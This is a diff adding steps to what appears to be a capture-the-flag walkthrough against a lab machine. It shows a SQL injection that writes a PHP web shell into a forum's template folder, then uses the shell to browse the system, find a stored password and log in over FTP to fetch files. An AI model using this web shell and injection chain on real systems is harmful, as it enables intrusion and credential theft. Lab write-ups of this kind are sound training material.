@@ -90,5 +90,21 @@
             SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/monfichier2.php" -- 1
         Now go to the page https://192.168.0.19/forum/templates_c/monfichier2.php?cmd=whoami
         We can now enter cmd (replace whoami by whatever you want, you can put spaces)
+        By searching a bit in the system with this method, we try the command
+            ls /home
+        And there is a homedir called "LOOKATME", so indeed we look at it
+        Into this directory we find a file called "password" with the following content:
+            lmezard:G!@M6f4Eatau{sF"
+        We use this combo to connect in ftp with the following command:
+            ftp 192.168.0.19 
+        In the ftp console we activate the passive mode with the command:
+            pass
+        And then with:
+            ls
+        We find 2 files, README and fun, to transfer them we execute:
+            get fun
+            get README
+        And they're automatically copied to the dir we executed the ftp command from
 
-
+    - fun file:
+        
